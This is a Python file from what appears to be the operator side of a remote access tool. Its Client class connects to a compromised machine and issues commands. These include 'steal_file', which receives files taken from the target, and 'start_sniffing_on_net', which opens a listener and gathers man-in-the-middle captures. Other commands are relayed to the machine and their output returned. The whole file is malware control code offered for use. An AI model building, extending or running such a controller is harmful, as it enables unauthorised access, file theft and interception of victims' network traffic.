from typing import List
from threading import Thread
from . import *


class Client:
    def __init__(self, ip=IP):
        self.mitm_server_socket = None
        self.mitm_client_socket = None
        self.mitm_info = ["Dddd", "Ddd"]
        self.socket = socket()
        self.ip = ip
        self.__connected = False

    def connect_to_server(self):
        t = self.socket.gettimeout()
        self.socket.settimeout(TIMEOUT_SOCKET)
        self.socket.connect((self.ip, PORT))
        self.__connected = True
        self.socket.settimeout(t)

    def __eq__(self, other) -> bool:
        if isinstance(other, Client):
            return other.ip == self.ip
        return other == self.ip

    def disconnect(self):
        self.__connected = False
        self.socket.close()
        pass

    @property
    def connected(self):
        try:
            send("ping", self.socket)
            ping = receive_msg(self.socket)
            return ping == "ping"
        except ConnectionError:
            return False

    def send_command(self, command: str, params: List[str]):
        if not self.__connected:
            return "This ovil is not connected"
        match command:
            case "start_sniffing_on_net":
                send(command, self.socket)
                self.start_sniffing_on_net()
                response = receive_msg(self.socket)
                return response
            case "steal_file":
                msg = [command]
                msg.extend(params)
                send(str(Massages.SEP.value).join(msg), self.socket)
                code, filename = receive_file(self.socket)
                if not code:
                    return Massages.NOT_OK.value, filename
                result = receive_msg(self.socket)
                return result, filename


        msg = [command]
        msg.extend(params)
        send(str(Massages.SEP.value).join(msg), self.socket)
        response = receive_msg(self.socket)
        # response = response.replace("\n", "<br>")
        return response

    def start_sniffing_on_net(self):
        self.mitm_server_socket = socket()
        self.mitm_server_socket.bind((self.ip, MITM_DEFAULT_PORT))
        self.mitm_server_socket.listen()
        self.mitm_client_socket, address = self.mitm_server_socket.accept()
        self.mitm_info = []
        t = Thread(target=self.mitm_thread)
        t.start()

    def mitm_thread(self):
        print("start to listen")
        try:
            while True:
                msg = receive_msg(self.mitm_client_socket)
                self.mitm_info.append(msg)
        except ConnectionError:
            return
